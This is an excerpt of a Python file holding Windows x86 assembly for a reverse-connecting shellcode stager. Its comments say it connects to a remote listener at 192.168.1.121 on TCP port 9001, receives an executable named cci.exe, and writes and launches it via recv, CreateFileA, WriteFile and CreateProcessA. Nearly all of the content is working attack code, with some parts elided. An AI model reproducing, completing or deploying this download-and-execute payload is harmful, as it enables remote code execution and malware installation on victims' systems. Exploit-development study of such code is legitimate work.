#!/usr/bin/python
#
# Reverse Shellcode for CCI (Command & Control Interface) receive, install and execute:
# This shellcode connects to a remote instance of the Python script "listen_and_send_file_data.py", listening on port TCP 9001.
# As soon as the shellcode connects to the listening script, the latter streams the data of cci.exe to the shellcode.
...
# Current stack layout (Example with 2 hashes):
...
resolve_ws2_sym:
    ...
    push 16;                                    # Push 16 (Total bytes of Hashes pushed + 4)
...
# Preparation of the sockaddr_in structure on the stack:
    mov ebx, eax;                               # EBX = socket fd open with WSSocketA
    xor edi, edi;                               # EDI = 0
    xor eax, eax;                               # EAX = 0
    push edi;                                   # Field sin_zero[]: bytes 4-7
    push edi;                                   # Field sin_zero[]: bytes 0-3
    push 0x7901A8C0;                            # Field sin_addr (192.168.1.121)
...
call_virtualalloc:
    push ebx;                                   # Save the socket on the stack
    push esp;
    pop edi;
    ...
    call dword ptr[esp + 0x44];                 # Call VirtualAlloc
    pop ebx;                                    # Restore the socket in EBX
...
call_recv:
    ...
    push ebx;                                   # Parameter s = socket
loop_recv_data:
    call dword ptr[esp + 0x2c];                 # Call recv: EAX = received bytes
...
call_createfilea:
    ...
    call dword ptr[esp + 144]                   # Call CreateFileA: EAX = file handle
...
call_writefile:
    ...
    call dword ptr[esp + 132]                   # Call WriteFile
...
load_advapi32:
    ...
    call dword ptr[esp + 124];                  # Call LoadLibraryA
...
call_createprocessa:
    ...
    call dword ptr[esp + 292];                  # call CreateProcessA
'''
)
